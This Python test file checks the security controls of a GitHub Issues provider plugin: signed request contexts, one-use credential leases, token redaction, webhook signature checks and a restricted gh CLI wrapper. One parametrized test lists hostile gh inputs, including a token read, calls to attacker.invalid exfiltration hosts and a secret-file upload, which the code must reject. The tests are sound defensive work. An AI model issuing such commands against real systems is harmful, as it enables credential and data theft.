"""Security and fixed-transport tests for GitHub Issues provider behavior.

中文:验证 GitHub Issues 提供方的权限、固定传输和 Webhook 验签行为。
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from collections.abc import Mapping
from dataclasses import replace
from typing import Any

import pytest
from cyrene_account_center_contracts import AuthMaterial, canonical_json
from cyrene_plugin_runtime.vendor_cli import VendorCliResult

from github_issues_provider._generated import tool_provider_pb2 as wire
from github_issues_provider.account_center import AccountCenterUnavailable
from github_issues_provider.github_api import GitHubApi, GitHubApiFailure, HttpResponse
from github_issues_provider.plugin import (
    CALL_TOOL_RESPONSE_TYPE_URL,
    WEBHOOK_REQUEST_TYPE_URL,
    GitHubIssuesProvider,
)
from github_issues_provider.settings import ProviderSettings, Repository


def make_settings() -> ProviderSettings:
    """Build one repo-scoped binding with distinct test keys."""

    return ProviderSettings(
        binding_id="github.binding.one",
        account_center_binding_id="account-center.binding.one",
        account_center_connection_ref="grpc://127.0.0.1:40000",
        account_center_transport="local",
        account_center_root_cert_ref=None,
        account_center_client_cert_ref=None,
        account_center_client_key_ref=None,
        host_secret_names={},
        repositories=(Repository("12345", "owner", "project"),),
        provider_caller_id="plugins.github-issues",
        exchange_caller_id="exchange.integrations",
        exchange_verification_key=b"\x22" * 32,
        provider_signing_key=b"\x33" * 32,
        github_webhook_secret=b"webhook test key with at least 32 bytes",
        allowed_installation_ids=frozenset({"99"}),
        allowed_events=frozenset({"issues"}),
        allowed_actions=frozenset({"opened", "closed", "reopened"}),
    )


class FakeAccountCenter:
    """Validate actor and digest bindings while enforcing one-use references."""

    def __init__(self) -> None:
        self.calls: list[tuple[dict[str, object], dict[str, str | int]]] = []
        self.used: set[str] = set()

    def redeem_credential_lease(
        self,
        payload: Mapping[str, object],
        trusted_context: Mapping[str, str | int],
    ) -> AuthMaterial:
        lease_ref = str(payload["lease_ref"])
        if lease_ref in self.used:
            raise AccountCenterUnavailable("lease is already used")
        self.used.add(lease_ref)
        self.calls.append((dict(payload), dict(trusted_context)))
        return AuthMaterial("secret-token-must-not-escape", "Bearer", "github-user-42", None)

    def redeem_provider_credential_lease(
        self,
        payload: Mapping[str, object],
        trusted_context: Mapping[str, str | int],
    ) -> AuthMaterial:
        lease_ref = str(payload["lease_ref"])
        if lease_ref in self.used:
            raise AccountCenterUnavailable("lease is already used")
        self.used.add(lease_ref)
        self.calls.append((dict(payload), dict(trusted_context)))
        return AuthMaterial(
            "installation-token-must-not-escape", "Bearer", "acme", int(time.time()) + 3600
        )


class FakeGitHubApi:
    """Record methods and return response shapes consumed by tool methods."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, tuple[Any, ...]]] = []

    def get_issue(self, *args: Any) -> dict[str, Any]:
        self.calls.append(("get", args))
        return {
            "issue_id": "555",
            "number": 7,
            "state": "OPEN",
            "title": "Task",
            "html_url": "https://github.com/owner/project/issues/7",
        }

    def create_comment(self, *args: Any) -> dict[str, Any]:
        self.calls.append(("comment", args))
        return {
            "status": "CONFIRMED",
            "comment_id": "777",
            "issue_number": 7,
            "repository_id": "12345",
            "body": args[2],
        }

    def update_state(self, *args: Any) -> dict[str, Any]:
        self.calls.append(("state", args))
        return {
            "status": "CONFIRMED",
            "issue": {
                "issue_id": "555",
                "number": 7,
                "state": args[2],
                "title": "Task",
                "html_url": "https://github.com/owner/project/issues/7",
            },
        }

    def get_pull_request(self, *args: Any) -> dict[str, Any]:
        self.calls.append(("pull_request", args))
        return {"pull_request": {"number": args[1], "state": "OPEN"}}


class FakeCliRunner:
    """Record the fixed process request and return local-only process evidence."""

    def __init__(self, result: VendorCliResult | None = None) -> None:
        self.calls: list[dict[str, Any]] = []
        self.result = result or VendorCliResult(0, 12, False, False, 128, 0)

    def run(self, executable: str, argv: list[str], **kwargs: Any) -> VendorCliResult:
        self.calls.append({"executable": executable, "argv": list(argv), **kwargs})
        return self.result


def signed_context(
    settings: ProviderSettings,
    arguments: Mapping[str, Any],
    lease_ref: str,
    operation_id: str,
    profile_ref: str | None = None,
) -> dict[str, Any]:
    """Sign the private Exchange envelope using the configured canonical form."""

    protected = {"payload": dict(arguments), "lease_ref": lease_ref}
    if profile_ref is not None:
        protected["profile_ref"] = profile_ref
    value: dict[str, Any] = {
        "method": "call_tool",
        "payload_sha256": hashlib.sha256(canonical_json(protected)).hexdigest(),
        "binding_id": settings.binding_id,
        "caller_id": settings.exchange_caller_id,
        "issuer": "https://identity.example.test",
        "subject": "member-27",
        "organization_id": "org-4",
        "workspace_id": "workspace-8",
        "request_id": "request-123",
        "issued_at": int(time.time()),
        "expires_at": int(time.time()) + 60,
        "operation_id": (
            "github.vendor.cli.execute" if operation_id == "github_vendor_cli" else operation_id
        ),
    }
    value["signature"] = hmac.new(
        settings.exchange_verification_key,
        canonical_json(value),
        hashlib.sha256,
    ).hexdigest()
    return value


def invoke_tool(
    provider: GitHubIssuesProvider,
    settings: ProviderSettings,
    tool_id: str,
    arguments: Mapping[str, Any],
    *,
    lease_ref: str = "12345678-1234-1234-1234-123456789abc",
    profile_ref: str | None = None,
    context: Mapping[str, Any] | None = None,
) -> tuple[bool, dict[str, Any]]:
    """Call through the same protobuf boundary used by DirectPluginRuntime."""

    envelope = {
        "payload": dict(arguments),
        "lease_ref": lease_ref,
        "trusted_context": dict(context or signed_context(settings, arguments, lease_ref, tool_id)),
    }
    if profile_ref is not None:
        envelope["profile_ref"] = profile_ref
        envelope["trusted_context"] = dict(
            context
            or signed_context(settings, arguments, lease_ref, tool_id, profile_ref=profile_ref)
        )
    request = wire.CallToolRequest(
        binding_id=settings.binding_id,
        provider_tool_id=tool_id,
        arguments_json=json.dumps(envelope, separators=(",", ":")),
    )
    ok, payload = provider.on_invoke("tool.provider.v1", "call_tool", request.SerializeToString())
    assert ok is True
    assert payload.type_url == CALL_TOOL_RESPONSE_TYPE_URL
    response = wire.CallToolResponse.FromString(payload.value)
    part = response.outcome.content[0]
    assert part.WhichOneof("content") == "json"
    return response.outcome.is_error, json.loads(part.json.json)


def test_catalog_has_exact_tools_and_closed_schemas() -> None:
    settings = make_settings()
    provider = GitHubIssuesProvider(settings=settings)
    request = wire.ListToolsRequest(binding_id=settings.binding_id)

    ok, payload = provider.on_invoke("tool.provider.v1", "list_tools", request.SerializeToString())

    assert ok is True
    catalog = wire.ListToolsResponse.FromString(payload.value).catalog
    assert [tool.provider_tool_id for tool in catalog.tools] == [
        "github.issue.get",
        "github.issue.comment.create",
        "github.issue.state.update",
        "github.repository.list",
        "github.repository.get",
        "github.branches.list",
        "github.pull_requests.list",
        "github.pull_request.get",
        "github.actions.runs.list",
        "github.ci.status",
        "github_vendor_cli",
    ]
    schemas = [json.loads(tool.input_schema_json) for tool in catalog.tools]
    assert all(schema["additionalProperties"] is False for schema in schemas)
    assert schemas[2]["properties"]["state"]["enum"] == ["OPEN", "CLOSED"]
    assert schemas[-1]["required"] == ["argv"]
    assert schemas[-1]["additionalProperties"] is False


def test_vendor_cli_uses_profile_lease_and_returns_suppressed_receipt() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    runner = FakeCliRunner()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)
    arguments = {"argv": ["pr", "list", "--repo", "owner/project"]}
    profile_ref = "00000000-0000-4000-8000-000000000001"

    is_error, result = invoke_tool(
        provider,
        settings,
        "github_vendor_cli",
        arguments,
        profile_ref=profile_ref,
    )

    assert is_error is False
    assert result["state"] == "COMMAND_COMPLETED"
    assert result["remote_state"] == "NOT_APPLICABLE"
    assert result["stdout_suppressed"] is True
    assert result["stderr_suppressed"] is True
    assert "secret-token-must-not-escape" not in json.dumps(result)
    assert account.calls[0][0] == {
        "lease_ref": "12345678-1234-1234-1234-123456789abc",
        "profile_ref": profile_ref,
        "operation_id": "github.vendor.cli.execute",
        "target": {},
        "arguments_sha256": hashlib.sha256(canonical_json(arguments)).hexdigest(),
    }
    assert runner.calls[0]["executable"] == "/usr/local/bin/gh"
    assert runner.calls[0]["argv"] == arguments["argv"]
    assert runner.calls[0]["credential_environment"] == {
        "GH_TOKEN": "installation-token-must-not-escape"
    }


def test_vendor_cli_mutation_exit_zero_stays_remote_state_unverified() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    runner = FakeCliRunner(VendorCliResult(0, 10, False, False, 0, 0))
    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)

    is_error, result = invoke_tool(
        provider,
        settings,
        "github_vendor_cli",
        {"argv": ["issue", "close", "7", "--repo", "owner/project"]},
        profile_ref="00000000-0000-4000-8000-000000000001",
    )

    assert is_error is False
    assert result["state"] == "REMOTE_STATE_UNVERIFIED"
    assert result["command_state"] == "COMMAND_COMPLETED"
    assert result["remote_state"] == "UNKNOWN_RESULT"
    assert result["operation_ref"].startswith("ghcli_")
    assert result["reconciliation_available"] is False


@pytest.mark.parametrize(
    "argv",
    [
        ["auth", "token"],
        ["api", "https://attacker.invalid/exfiltrate"],
        ["release", "upload", "v1", "./secret.bin"],
        ["pr", "list", "--repo", "other/private"],
        ["api", "/user", "--hostname", "attacker.invalid"],
        ["issue", "create", "--body-file", "/tmp/body.md"],
    ],
)
def test_vendor_cli_rejects_credentials_external_hosts_local_files_and_scope_escape(
    argv: list[str],
) -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    runner = FakeCliRunner()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, cli_runner=runner)

    envelope = {
        "payload": {"argv": argv},
        "profile_ref": "00000000-0000-4000-8000-000000000001",
        "lease_ref": "12345678-1234-1234-1234-123456789abc",
        "trusted_context": signed_context(
            settings,
            {"argv": argv},
            "12345678-1234-1234-1234-123456789abc",
            "github_vendor_cli",
            profile_ref="00000000-0000-4000-8000-000000000001",
        ),
    }
    request = wire.CallToolRequest(
        binding_id=settings.binding_id,
        provider_tool_id="github_vendor_cli",
        arguments_json=json.dumps(envelope, separators=(",", ":")),
    )
    ok, result = provider.on_invoke(
        "tool.provider.v1", "call_tool", request.SerializeToString()
    )

    assert ok is False
    assert result == "INVALID_ARGUMENTS: tool arguments do not match the schema"
    assert account.calls == []
    assert runner.calls == []


def test_repository_owner_scope_and_arbitrary_url_are_rejected_before_redeem() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, github_api=api)
    invalid = {"repository_id": "12345", "repository": "other/project", "issue_number": 7}

    is_error, result = invoke_tool(provider, settings, "github.issue.get", invalid)

    assert is_error is True
    assert result["error"]["code"] == "INVALID_ARGUMENTS"
    assert account.calls == []
    assert api.calls == []

    arbitrary = {
        "repository_id": "12345",
        "repository": "owner/project",
        "issue_number": 7,
        "url": "https://attacker.invalid/steal",
    }
    lease_ref = "12345678-1234-1234-1234-123456789abc"
    envelope = {
        "payload": arbitrary,
        "lease_ref": lease_ref,
        "trusted_context": signed_context(settings, arbitrary, lease_ref, "github.issue.get"),
    }
    request = wire.CallToolRequest(
        binding_id=settings.binding_id,
        provider_tool_id="github.issue.get",
        arguments_json=json.dumps(envelope),
    )
    ok, result = provider.on_invoke("tool.provider.v1", "call_tool", request.SerializeToString())
    assert ok is False
    assert result == "INVALID_ARGUMENTS: tool arguments do not match the schema"
    assert account.calls == []


def test_bad_trusted_context_is_denied_without_installation_fallback() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, github_api=api)
    arguments = {"repository_id": "12345", "repository": "owner/project", "issue_number": 7}
    context = signed_context(
        settings,
        arguments,
        "12345678-1234-1234-1234-123456789abc",
        "github.issue.get",
    )
    context["subject"] = "attacker"

    is_error, result = invoke_tool(
        provider, settings, "github.issue.get", arguments, context=context
    )

    assert is_error is True
    assert result["error"]["code"] == "AUTHENTICATION_DENIED"
    assert account.calls == []
    assert api.calls == []


def test_missing_account_port_fails_closed_and_never_uses_installation_credentials() -> None:
    settings = make_settings()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, github_api=api)
    arguments = {"repository_id": "12345", "repository": "owner/project", "issue_number": 7}

    is_error, result = invoke_tool(provider, settings, "github.issue.get", arguments)

    assert is_error is True
    assert result["error"]["code"] == "AUTHORIZATION_UNAVAILABLE"
    assert api.calls == []


def test_user_token_stays_private_and_lease_payload_is_actor_operation_scoped() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, github_api=api)
    arguments = {"repository_id": "12345", "repository": "owner/project", "issue_number": 7}

    is_error, result = invoke_tool(provider, settings, "github.issue.get", arguments)

    assert is_error is False
    assert result["issue_id"] == "555"
    assert "secret-token-must-not-escape" not in json.dumps(result)
    payload, trusted_context = account.calls[0]
    assert payload == {
        "lease_ref": "12345678-1234-1234-1234-123456789abc",
        "operation_id": "github.issue.get",
        "resource": {"repository_id": "12345", "repository": "owner/project", "issue_number": 7},
        "arguments_sha256": hashlib.sha256(canonical_json(arguments)).hexdigest(),
    }
    assert trusted_context["subject"] == "member-27"
    assert trusted_context["caller_id"] == settings.provider_caller_id
    assert trusted_context["binding_id"] == settings.account_center_binding_id
    assert api.calls[0][0] == "get"


def test_profile_lease_binds_exact_target_and_reads_pull_request() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, github_api=api)
    arguments = {
        "repository_id": "12345",
        "repository": "owner/project",
        "pull_number": 4,
    }
    lease_ref = "12345678-1234-1234-1234-123456789abc"
    profile_ref = "00000000-0000-4000-8000-000000000001"

    is_error, result = invoke_tool(
        provider,
        settings,
        "github.pull_request.get",
        arguments,
        lease_ref=lease_ref,
        profile_ref=profile_ref,
    )

    assert is_error is False
    assert result["pull_request"]["number"] == 4
    lease_payload, trusted_context = account.calls[0]
    assert lease_payload == {
        "lease_ref": lease_ref,
        "profile_ref": profile_ref,
        "operation_id": "github.pull_request.get",
        "target": {
            "repository_id": "12345",
            "repository": "owner/project",
            "pull_number": 4,
        },
        "arguments_sha256": hashlib.sha256(canonical_json(arguments)).hexdigest(),
    }
    assert trusted_context["method"] == "redeem_provider_credential_lease"
    assert api.calls[0][0] == "pull_request"


def test_lease_reference_is_one_use_and_not_redeemed_again_after_replay() -> None:
    settings = make_settings()
    account = FakeAccountCenter()
    api = FakeGitHubApi()
    provider = GitHubIssuesProvider(settings=settings, account_center=account, github_api=api)
    arguments = {"repository_id": "12345", "repository": "owner/project", "issue_number": 7}
    lease = "12345678-1234-1234-1234-123456789abc"

    invoke_tool(provider, settings, "github.issue.get", arguments, lease_ref=lease)
    is_error, result = invoke_tool(
        provider, settings, "github.issue.get", arguments, lease_ref=lease
    )

    assert is_error is True
    assert result["error"]["code"] == "AUTHORIZATION_UNAVAILABLE"
    assert len(account.calls) == 1
    assert len(api.calls) == 1


def test_webhook_signature_is_checked_before_raw_json_decode() -> None:
    settings = make_settings()
    provider = GitHubIssuesProvider(settings=settings)
    raw_body = b"not-json"
    request = {
        "delivery_id": "delivery-1",
        "event": "issues",
        "signature": "sha256=" + "0" * 64,
        "raw_body_base64": base64.b64encode(raw_body).decode("ascii"),
    }

    ok, payload = provider.on_invoke(
        "tool.provider.v1",
        "normalize_webhook",
        json.dumps(request, separators=(",", ":")).encode(),
        request_type_url=WEBHOOK_REQUEST_TYPE_URL,
    )

    assert ok is True
    response = json.loads(payload.value)
    assert response == {"error": {"code": "INVALID_SIGNATURE"}}


def test_valid_webhook_is_normalized_only_after_signature_and_allowlist_checks() -> None:
    settings = make_settings()
    provider = GitHubIssuesProvider(settings=settings)
    raw_body = json.dumps(
        {
            "action": "opened",
            "installation": {"id": 99},
            "repository": {"id": 12345, "full_name": "owner/project"},
            "issue": {
                "id": 555,
                "number": 7,
                "state": "open",
                "title": "Task title",
                "body": "Task body",
            },
            "sender": {"id": 700, "login": "reporter"},
        },
        separators=(",", ":"),
    ).encode()
    signature = (
        "sha256=" + hmac.new(settings.github_webhook_secret, raw_body, hashlib.sha256).hexdigest()
    )
    request = {
        "delivery_id": "delivery-2",
        "event": "issues",
        "signature": signature,
        "raw_body_base64": base64.b64encode(raw_body).decode("ascii"),
    }

    ok, payload = provider.on_invoke(
        "tool.provider.v1",
        "normalize_webhook",
        json.dumps(request, separators=(",", ":")).encode(),
        request_type_url=WEBHOOK_REQUEST_TYPE_URL,
    )

    assert ok is True
    assert json.loads(payload.value) == {
        "event_type": "issues",
        "action": "opened",
        "repository_id": "12345",
        "issue_number": 7,
        "sender_id": "700",
        "sender_login": "reporter",
        "title": "Task title",
        "body": "Task body",
        "self_authored": False,
    }


def test_issue_comment_webhook_returns_a_deterministic_closed_projection() -> None:
    settings = replace(
        make_settings(),
        allowed_events=frozenset({"issue_comment"}),
        allowed_actions=frozenset({"created"}),
    )
    provider = GitHubIssuesProvider(settings=settings)
    raw_body = json.dumps(
        {
            "action": "created",
            "installation": {"id": 99},
            "repository": {"id": 12345, "full_name": "owner/project"},
            "issue": {
                "id": 555,
                "number": 7,
                "title": "Task title",
                "body": "Original issue body",
                "user": {"id": 500, "login": "original-author"},
            },
            "comment": {"id": 888, "body": "A member comment"},
            "sender": {"id": 700, "login": "comment-author"},
        },
        separators=(",", ":"),
    ).encode()
    signature = (
        "sha256=" + hmac.new(settings.github_webhook_secret, raw_body, hashlib.sha256).hexdigest()
    )

    def normalize(delivery_id: str) -> dict[str, Any]:
        request = {
            "delivery_id": delivery_id,
            "event": "issue_comment",
            "signature": signature,
            "raw_body_base64": base64.b64encode(raw_body).decode("ascii"),
        }
        ok, payload = provider.on_invoke(
            "tool.provider.v1",
            "normalize_webhook",
            json.dumps(request, separators=(",", ":")).encode(),
            request_type_url=WEBHOOK_REQUEST_TYPE_URL,
        )
        assert ok is True
        return json.loads(payload.value)

    expected = {
        "event_type": "issue_comment",
        "action": "created",
        "repository_id": "12345",
        "issue_number": 7,
        "sender_id": "700",
        "sender_login": "comment-author",
        "title": "Task title",
        "body": "A member comment",
        "self_authored": False,
    }
    assert normalize("delivery-a") == expected
    assert normalize("delivery-b") == expected


def test_webhook_envelope_rejects_unbound_connection_identity() -> None:
    settings = make_settings()
    provider = GitHubIssuesProvider(settings=settings)
    raw_body = b"{}"
    request = {
        "connection_id": "caller-selected-connection",
        "delivery_id": "delivery-1",
        "event": "issues",
        "signature": "sha256="
        + hmac.new(settings.github_webhook_secret, raw_body, hashlib.sha256).hexdigest(),
        "raw_body_base64": base64.b64encode(raw_body).decode("ascii"),
    }

    ok, result = provider.on_invoke(
        "tool.provider.v1",
        "normalize_webhook",
        json.dumps(request, separators=(",", ":")).encode(),
        request_type_url=WEBHOOK_REQUEST_TYPE_URL,
    )

    assert ok is True
    assert result.type_url.endswith("WebhookResponse")
    assert json.loads(result.value) == {"error": {"code": "INVALID_REQUEST"}}


def test_github_transport_uses_only_fixed_host_and_sanitizes_token_and_errors() -> None:
    settings = make_settings()
    observed: list[tuple[str, str, str, dict[str, str], bytes | None]] = []

    def transport(
        method: str,
        host: str,
        path: str,
        headers: Mapping[str, str],
        body: bytes | None,
    ) -> HttpResponse:
        observed.append((method, host, path, dict(headers), body))
        if path == "/repos/owner/project":
            return HttpResponse(200, {}, b'{"id":12345,"full_name":"owner/project"}')
        return HttpResponse(403, {}, b'{"message":"private token value must not escape"}')

    api = GitHubApi(settings, transport=transport)
    try:
        api.get_issue(settings.repositories[0], 7, "private-token-value")
    except GitHubApiFailure as error:
        assert error.code == "AUTHORIZATION_DENIED"
        assert "private-token-value" not in str(error)
    else:
        raise AssertionError("authorization failure was not raised")

    assert [call[1] for call in observed] == ["api.github.com", "api.github.com"]
    assert observed[0][2] == "/repos/owner/project"
    assert observed[1][2] == "/repos/owner/project/issues/7"
    assert observed[0][3]["Authorization"] == "Bearer private-token-value"


def test_github_repository_branch_pull_and_ci_reads_use_fixed_allowlisted_paths() -> None:
    settings = make_settings()
    repository = settings.repositories[0]
    observed: list[str] = []

    def transport(
        method: str,
        host: str,
        path: str,
        headers: Mapping[str, str],
        body: bytes | None,
    ) -> HttpResponse:
        assert host == "api.github.com"
        assert method == "GET"
        observed.append(path)
        if path == "/installation/repositories?per_page=100":
            return HttpResponse(
                200,
                {},
                b'{"repositories":[{"id":12345,"full_name":"owner/project","private":true,"default_branch":"main","html_url":"https://github.com/owner/project"}]}',
            )
        if path == "/repos/owner/project":
            return HttpResponse(
                200,
                {},
                b'{"id":12345,"full_name":"owner/project","private":true,"default_branch":"main","html_url":"https://github.com/owner/project"}',
            )
        if path.endswith("/branches?per_page=100"):
            return HttpResponse(200, {}, b'[{"name":"main","commit":{"sha":"abc1234567890"}}]')
        if path.endswith("/pulls?state=open&per_page=100"):
            return HttpResponse(
                200,
                {},
                b'[{"number":4,"state":"open","title":"Review","head":{"sha":"deadbeef1234567"},"base":{"ref":"main"},"html_url":"https://github.com/owner/project/pull/4","draft":false}]',
            )
        if path.endswith("/pulls/4"):
            return HttpResponse(
                200,
                {},
                b'{"number":4,"state":"open","title":"Review","head":{"sha":"deadbeef1234567"},"base":{"ref":"main"},"repository":{"id":12345,"full_name":"owner/project"}}',
            )
        if path.endswith("/actions/runs?per_page=100&branch=main"):
            return HttpResponse(
                200,
                {},
                b'{"workflow_runs":[{"id":99,"name":"CI","status":"completed","conclusion":"success","head_sha":"deadbeef1234567"}]}',
            )
        if path.endswith("/commits/deadbeef1234567/status"):
            return HttpResponse(
                200,
                {},
                b'{"state":"success","statuses":[{"context":"tests","state":"success"}]}',
            )
        if path.endswith("/commits/deadbeef1234567/check-runs?per_page=100"):
            return HttpResponse(
                200,
                {},
                b'{"check_runs":[{"name":"unit","status":"completed","conclusion":"success"}]}',
            )
        raise AssertionError(path)

    api = GitHubApi(settings, transport=transport)
    assert api.list_repositories("token")["repositories"][0]["repository_id"] == "12345"
    assert api.get_repository(repository, "token")["default_branch"] == "main"
    assert api.list_branches(repository, "token")["branches"][0]["name"] == "main"
    assert api.list_pull_requests(repository, "OPEN", "token")["pull_requests"][0]["number"] == 4
    pull_request = api.get_pull_request(repository, 4, "token")
    assert pull_request["pull_request"]["head_sha"] == "deadbeef1234567"
    workflow_runs = api.list_workflow_runs(repository, "token", branch="main")
    assert workflow_runs["workflow_runs"][0]["status"] == "COMPLETED"
    assert api.get_ci_status(repository, "deadbeef1234567", "token")["state"] == "SUCCESS"
    assert observed.count("/repos/owner/project") == 6
    assert all(
        path.startswith(("/repos/owner/project", "/installation/repositories")) for path in observed
    )


def test_rate_limit_and_server_failures_are_bounded_and_retry_hints_are_preserved() -> None:
    settings = make_settings()

    for response, expected_code, expected_retry, expected_after in (
        (HttpResponse(429, {"retry-after": "37"}, b"secret detail"), "RATE_LIMITED", True, 37),
        (
            HttpResponse(503, {"retry-after": "500000"}, b"secret detail"),
            "UPSTREAM_UNAVAILABLE",
            True,
            86_400,
        ),
    ):

        def transport(
            method: str,
            host: str,
            path: str,
            headers: Mapping[str, str],
            body: bytes | None,
            *,
            failure: HttpResponse = response,
        ) -> HttpResponse:
            if path == "/repos/owner/project":
                return HttpResponse(200, {}, b'{"id":12345,"full_name":"owner/project"}')
            return failure

        api = GitHubApi(settings, transport=transport)
        try:
            api.get_issue(settings.repositories[0], 7, "user-token")
        except GitHubApiFailure as error:
            assert error.code == expected_code
            assert error.retryable is expected_retry
            assert error.retry_after == expected_after
            assert "secret detail" not in str(error)
        else:
            raise AssertionError("provider failure was not raised")


def test_state_and_comment_receipts_require_real_provider_ids_or_readback() -> None:
    settings = make_settings()

    def uncertain_transport(
        method: str, host: str, path: str, headers: Mapping[str, str], body: bytes | None
    ) -> HttpResponse:
        if path == "/repos/owner/project":
            return HttpResponse(200, {}, b'{"id":12345,"full_name":"owner/project"}')
        if method == "POST":
            raise TimeoutError("write outcome uncertain")
        return HttpResponse(200, {}, b'{"id":55,"number":7,"state":"closed","title":"T"}')

    api = GitHubApi(settings, transport=uncertain_transport)
    try:
        api.create_comment(settings.repositories[0], 7, "hello", "token")
    except GitHubApiFailure as error:
        assert error.code == "UPSTREAM_UNCERTAIN"
        assert error.uncertain is True
        assert error.retryable is False
    else:
        raise AssertionError("ambiguous comment write must not report receipt")

    result = api.update_state(settings.repositories[0], 7, "CLOSED", "token")
    assert result["status"] == "CONFIRMED"
    assert result["issue"]["state"] == "CLOSED"
